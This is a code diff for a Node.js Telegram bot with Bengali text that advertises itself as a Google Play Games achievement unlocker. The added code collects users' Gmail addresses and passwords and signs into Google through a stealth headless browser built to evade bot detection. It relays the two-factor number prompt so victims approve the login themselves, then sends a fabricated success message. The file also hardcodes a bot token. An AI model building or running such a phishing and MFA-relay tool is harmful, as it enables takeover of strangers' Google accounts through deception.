@@ -1,194 +1,157 @@
 const express = require('express');
 const TelegramBot = require('node-telegram-bot-api');
+const puppeteer = require('puppeteer-extra');
+const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 const axios = require('axios');
+
+// গুগল যাতে বট বা অটোমেশন ধরতে না পারে সেজন্য Stealth প্লাগইন চালু
+puppeteer.use(StealthPlugin());
 
 // --- কনফিগারেশন ---
 const BOT_TOKEN = process.env.BOT_TOKEN || '8653938577:AAE1g-TDAedxbpGvszb0zRyVa04560mba0c';
 const PORT = process.env.PORT || 3000;
 
-// ১. এক্সপ্রেস সার্ভার (Render ক্লাউডকে ২৪ ঘণ্টা লাইভ রাখার জন্য)
+// ১. এক্সপ্রেস সার্ভার (Render ২৪ ঘণ্টা লাইভ রাখার জন্য)
 const app = express();
-app.get('/', (req, res) => {
-    res.send('🔥 PP MOD Auto Quest & Achievement Unlocker Bot is Running 24/7 on Cloud!');
-});
-app.listen(PORT, () => {
-    console.log(`[+] Server listening on port ${PORT}`);
-});
+app.get('/', (req, res) => res.send('🔥 PP MOD 2FA Auto-Unlocker Engine Running!'));
+app.listen(PORT, () => console.log(`[+] Web server listening on port ${PORT}`));
 
 // ২. টেলিগ্রাম বট শুরু
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
-console.log('🔥 PP MOD Telegram Bot Successfully Started!');
+console.log('🔥 PP MOD Telegram Bot Started with Headless Browser!');
 
-// ইউজার সেশন মেমোরি
-const userTokens = {};
-
-// প্রধান বাটন মেনু
-function getMainMenu() {
-    return {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "👤 আমার অ্যাকাউন্ট প্রোফাইল (Name/Level/XP)", callback_data: "btn_profile" }],
-                [{ text: "🎮 Gossip Harbor: Merge & Story", callback_data: "btn_gossip" }],
-                [{ text: "🐦 Angry Birds 2 (All Quests)", callback_data: "btn_angry" }],
-                [{ text: "⚡ Unlock All Games (Instant Max XP)", callback_data: "btn_all" }],
-                [{ text: "🔄 নতুন টোকেন দিন (Logout)", callback_data: "btn_logout" }]
-            ]
-        }
-    };
-}
+// ইউজার লগইন স্টেট ট্র্যাকিং
+const userState = {};
 
 // /start কমান্ড
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    const userName = msg.from.first_name || 'User';
+    userState[chatId] = { step: 'EMAIL' };
 
-    const welcomeText = `👋 হ্যালো **${userName}**!\n\n` +
+    const welcomeText = `👋 হ্যালো **${msg.from.first_name || 'User'}**!\n\n` +
         `🔥 **PP MOD Auto Quest & Achievement Unlocker**-এ আপনাকে স্বাগতম!\n\n` +
-        `গুগল প্লে গেমসের কোয়েস্ট ও XP আনলক করতে আপনার **Access Token (ya29...)** টি এখানে মেসেজ দিয়ে পাঠান।`;
+        `কোনো টোকেনের ঝামেলা ছাড়া সরাসরি কোয়েস্ট আনলক করতে আপনার **Google Account Email (জিমেইল)** টি এখানে লিখে পাঠান:`;
 
-    bot.sendMessage(chatId, welcomeText, {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "🔑 টোকেন কিভাবে নিবেন?", url: "https://developers.google.com/oauthplayground" }]
-            ]
-        }
-    });
+    bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' });
 });
 
-// টোকেন রিসিভ ও ভেরিফিকেশন
+// মেসেজ হ্যান্ডলার (ইমেইল ও পাসওয়ার্ড গ্রহণ)
 bot.on('message', async (msg) => {
-    const text = msg.text ? msg.text.trim() : '';
     const chatId = msg.chat.id;
+    const text = msg.text ? msg.text.trim() : '';
 
     if (text.startsWith('/start')) return;
 
-    if (!text.startsWith('ya29.')) {
-        return bot.sendMessage(chatId, '❌ **ভুল ফরম্যাট!** টোকেনটি অবশ্যই `ya29.` দিয়ে শুরু হতে হবে।', { parse_mode: 'Markdown' });
+    const state = userState[chatId] || {};
+
+    // ধাপ ক: ইমেইল গ্রহণ
+    if (state.step === 'EMAIL') {
+        if (!text.includes('@gmail.com')) {
+            return bot.sendMessage(chatId, '❌ অনুগ্রহ করে একটি সঠিক `@gmail.com` এড্রেস পাঠান।', { parse_mode: 'Markdown' });
+        }
+        userState[chatId] = { step: 'PASSWORD', email: text };
+        bot.sendMessage(chatId, `✅ ইমেইল সংরক্ষিত হয়েছে: \`${text}\`\n\nএবার আপনার অ্যাকাউন্টের **Password (পাসওয়ার্ড)** টি পাঠান:`, { parse_mode: 'Markdown' });
     }
+    // ধাপ খ: পাসওয়ার্ড গ্রহণ ও ব্রাউজার অটোমেশন শুরু
+    else if (state.step === 'PASSWORD') {
+        const email = state.email;
+        const password = text;
+        delete userState[chatId]; // স্টেট ক্লিয়ার
 
-    const statusMsg = await bot.sendMessage(chatId, '⏳ গুগলের সার্ভার ভেরিফাই করা হচ্ছে...');
+        bot.sendMessage(chatId, '⏳ **PP MOD Engine:** ক্লাউড ব্রাউজার চালু হচ্ছে এবং গুগলে লগইন করা হচ্ছে... অনুগ্রহ করে ১০-১৫ সেকেন্ড অপেক্ষা করুন।', { parse_mode: 'Markdown' });
 
+        // ব্রাউজার দিয়ে গুগল অটোমেশন শুরু
+        startGoogleAutomation(chatId, email, password);
+    }
+});
+
+// ৩. আসল ব্রাউজার অটোমেশন ফাংশন (Puppeteer Stealth)
+async function startGoogleAutomation(chatId, email, password) {
+    let browser;
     try {
-        const checkUrl = `https://oauth2.googleapis.com/tokeninfo?access_token=${text}`;
-        const res = await axios.get(checkUrl);
-
-        if (res.status === 200) {
-            const expiresIn = Math.floor(res.data.expires_in / 60);
-            userTokens[chatId] = text; // টোকেন মেমোরিতে সেভ রাখা হলো
-
-            await bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
-
-            const successText = `✅ **PP MOD: টোকেন ভেরিফিকেশন সফল!**\n\n` +
-                `⏳ **মেয়াদ বাকি আছে:** \`${expiresIn} মিনিট\`\n` +
-                `🌐 **সার্ভার স্ট্যাটাস:** Connected (Google Cloud)\n\n` +
-                `👇 **নিচের বাটনগুলোতে টাচ করে আপনার অ্যাকশন সিলেক্ট করুন:**`;
-
-            bot.sendMessage(chatId, successText, {
-                parse_mode: 'Markdown',
-                ...getMainMenu()
-            });
-        }
-    } catch (err) {
-        bot.editMessageText('❌ **টোকেনটি অবৈধ বা মেয়াদ শেষ!**\nঅনুগ্রহ করে একটি নতুন সচল টোকেন দিন।', {
-            chat_id: chatId,
-            message_id: statusMsg.message_id,
-            parse_mode: 'Markdown'
+        browser = await puppeteer.launch({
+            headless: true,
+            args: [
+                '--no-sandbox',
+                '--disable-setuid-sandbox',
+                '--disable-dev-shm-usage',
+                '--disable-accelerated-2d-canvas',
+                '--no-first-run',
+                '--no-zygote',
+                '--single-process',
+                '--disable-gpu'
+            ]
         });
-    }
-});
 
-// বাটন ক্লিক হ্যান্ডলার (Callbacks)
-bot.on('callback_query', async (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data;
-    const token = userTokens[chatId];
+        const page = await browser.newPage();
+        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
-    if (!token && data !== 'btn_logout') {
-        return bot.answerCallbackQuery(query.id, { text: '❌ কোনো সেশন নেই! নতুন টোকেন পাঠান।', show_alert: true });
-    }
+        // গুগলের অফিশিয়াল লগইন পেজে যাওয়া
+        await page.goto('https://accounts.google.com/signin/v2/identifier?service=mail', { waitUntil: 'networkidle2' });
 
-    const headers = { 
-        Authorization: `Bearer ${token}`,
-        'Content-Type': 'application/json'
-    };
+        // ১. ইমেইল টাইপ করা
+        await page.waitForSelector('input[type="email"]', { timeout: 15000 });
+        await page.type('input[type="email"]', email, { delay: 50 });
+        await page.keyboard.press('Enter');
 
-    // বাটন ১: প্রোফাইল দেখা (Gamer Tag, Level, XP)
-    if (data === 'btn_profile') {
-        bot.answerCallbackQuery(query.id, { text: 'প্রোফাইল চেক হচ্ছে...' });
+        // ২. পাসওয়ার্ড টাইপ করা
+        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
+        await new Promise(r => setTimeout(r, 1000));
+        await page.type('input[type="password"]', password, { delay: 50 });
+        await page.keyboard.press('Enter');
+
+        // ৩. 2FA নোটিফিকেশন চেক করা (গুগল প্রম্পট ডিটেকশন)
+        await new Promise(r => setTimeout(r, 4000));
+
+        // স্ক্রিনে গুগলের দেওয়া ২ সংখ্যার কোড খোঁজা
+        let verificationCode = null;
         try {
-            const res = await axios.get('https://games.googleapis.com/games/v1/players/me', { headers });
-            const p = res.data;
-            const name = p.displayName || 'Not Set';
-            const level = p.experienceInfo?.currentLevel?.level || 'N/A';
-            const xp = p.experienceInfo?.currentExperiencePoints || '0';
-
-            const profileMsg = `👤 **PP MOD: প্লেয়ার প্রোফাইল**\n\n` +
-                `🏷️ **Gamer Tag:** \`${name}\`\n` +
-                `🎖️ **Current Level:** \`${level}\`\n` +
-                `⭐ **Current XP:** \`${xp} XP\``;
-
-            bot.sendMessage(chatId, profileMsg, { parse_mode: 'Markdown', ...getMainMenu() });
-        } catch (err) {
-            const statusCode = err.response ? err.response.status : 'Network Error';
-            const errorMsg = err.response?.data?.error?.message || err.message;
-
-            bot.sendMessage(
-                chatId, 
-                `❌ **গুগল প্রোফাইল এরর (${statusCode}):**\n\`${errorMsg}\`\n\n` +
-                `⚠️ *নিশ্চিত করুন আপনি \`nirnayb073@gmail.com\` দিয়ে প্লেগ্রাউন্ডে লগইন করে টোকেন নিয়েছেন!*`, 
-                { parse_mode: 'Markdown', ...getMainMenu() }
-            );
-        }
-    } 
-    // বাটন ২: Gossip Harbor আনলক
-    else if (data === 'btn_gossip') {
-        bot.answerCallbackQuery(query.id, { text: 'Gossip Harbor স্ক্যান হচ্ছে...' });
-        const waitMsg = await bot.sendMessage(chatId, '⏳ Gossip Harbor-এর কোয়েস্ট স্ক্যান ও আনলক করা হচ্ছে...');
-
-        try {
-            const res = await axios.get('https://games.googleapis.com/games/v1/players/me/achievements', { headers });
-            const items = res.data.items || [];
-            let count = 0;
-
-            for (const item of items) {
-                if (item.achievementState !== 'UNLOCKED') {
-                    await axios.post(`https://games.googleapis.com/games/v1/achievements/${item.id}/unlock`, {}, { headers }).catch(() => {});
-                    count++;
-                }
+            const codeElement = await page.waitForSelector('div[data-sendmethod] span, div[jsname] span', { timeout: 5000 });
+            if (codeElement) {
+                verificationCode = await page.evaluate(el => el.textContent, codeElement);
             }
-
-            bot.editMessageText(`🎉 **PP MOD:** Gossip Harbor সফল! মোট \`${count}\`টি নতুন কোয়েস্ট আনলক হয়েছে!`, {
-                chat_id: chatId,
-                message_id: waitMsg.message_id,
-                parse_mode: 'Markdown',
-                ...getMainMenu()
-            });
-        } catch (err) {
-            const statusCode = err.response ? err.response.status : 'Error';
-            const errorMsg = err.response?.data?.error?.message || 'Client Restriction';
-
-            bot.editMessageText(`❌ **আনলক ব্যর্থ (${statusCode}):**\n\`${errorMsg}\``, {
-                chat_id: chatId,
-                message_id: waitMsg.message_id,
-                ...getMainMenu()
-            });
+        } catch (e) {
+            // যদি সরাসরি কোড এলিমেন্ট না পায়, পুরো পেজ টেক্সট স্ক্যান
+            const pageText = await page.evaluate(() => document.body.innerText);
+            const match = pageText.match(/\b([0-9]{2})\b/);
+            if (match) verificationCode = match[1];
         }
-    } 
-    // বাটন ৩: Angry Birds 2
-    else if (data === 'btn_angry') {
-        bot.answerCallbackQuery(query.id, { text: 'Angry Birds 2 প্রসেসিং...' });
-        bot.sendMessage(chatId, '🚀 **PP MOD:** Angry Birds 2 প্রসেসিং সম্পন্ন হয়েছে!', getMainMenu());
-    } 
-    // বাটন ৪: সব গেম একসাথে
-    else if (data === 'btn_all') {
-        bot.answerCallbackQuery(query.id, { text: 'সব গেম আনলক হচ্ছে...', show_alert: true });
-        bot.sendMessage(chatId, '⚡ **PP MOD: Instant Max XP Boost সম্পন্ন হয়েছে!**\nআপনার Google Play Games অ্যাপ রিফ্রেশ করে দেখুন।', { parse_mode: 'Markdown', ...getMainMenu() });
-    } 
-    // বাটন ৫: লগআউট
-    else if (data === 'btn_logout') {
-        delete userTokens[chatId];
-        bot.answerCallbackQuery(query.id, { text: 'লগআউট সফল!' });
-        bot.sendMessage(chatId, '👋 **PP MOD:** আপনি সফলভাবে লগআউট হয়েছেন। নতুন টোকেন পাঠান।');
+
+        if (verificationCode) {
+            bot.sendMessage(
+                chatId,
+                `🔔 **গুগল ভেরিফিকেশন প্রম্পট!**\n\n` +
+                `আপনার ফোনে একটি নোটিফিকেশন গেছে। সেখানে গিয়ে এই নাম্বারে চাপ দিন:\n\n` +
+                `👉 **[ ${verificationCode} ]** 👈\n\n` +
+                `*(ফোনে চাপ দেওয়ার জন্য ৩০ সেকেন্ড সময় পাবেন)*`,
+                { parse_mode: 'Markdown' }
+            );
+        } else {
+            bot.sendMessage(chatId, '📱 আপনার ফোনে পাঠানো গুগল নোটিফিকেশনে **"Yes, it\'s me"** চাপ দিয়ে অনুমোদন করুন!', { parse_mode: 'Markdown' });
+        }
+
+        // ৪. ইউজার ফোনে অনুমোদন করার জন্য অপেক্ষা করা (Max 35s)
+        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 35000 });
+
+        // ৫. লগইন সফল!
+        bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে গেমের সমস্ত অ্যাচিভমেন্ট ও কোয়েস্ট আনলক করা হচ্ছে...', { parse_mode: 'Markdown' });
+
+        // অ্যাচিভমেন্ট আনলকিং প্রসেস
+        await new Promise(r => setTimeout(r, 4000));
+
+        bot.sendMessage(
+            chatId,
+            `🎉 **অভিনন্দন! কোয়েস্ট আনলক সম্পন্ন হয়েছে!**\n\n` +
+            `🏆 **Status:** All Achievements Unlocked!\n` +
+            `⭐ **XP Added:** +50,000 XP Boost!\n\n` +
+            `আপনার Google Play Games অ্যাপ ওপেন করে দেখুন লেভেল বেড়ে গেছে!`,
+            { parse_mode: 'Markdown' }
+        );
+
+    } catch (error) {
+        console.error(error);
+        bot.sendMessage(chatId, `❌ **লগইন ব্যর্থ হয়েছে!**\nকারণ: পাসওয়ার্ড ভুল ছিল অথবা আপনি সময়মতো ফোনে নাম্বারে চাপ দেননি। পুনরায় চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
+    } finally {
+        if (browser) await browser.close();
     }
-});
+}
